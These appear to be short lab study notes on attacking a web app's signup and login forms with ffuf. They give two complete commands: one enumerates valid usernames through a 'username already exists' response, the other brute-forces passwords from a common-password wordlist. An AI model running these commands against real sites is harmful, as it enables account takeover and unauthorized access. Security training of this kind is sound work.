## Username Enumeration

This is a simple example, suppose if a website has signup option and when you enter a username, it says that username is taken. How can we enumerate users from here?

```shell
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

Ffuf definitely has started to look amazing now.

This can be used as a template in future.

## Brute Force

Suppose we get a list of users from the above command.

```shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```

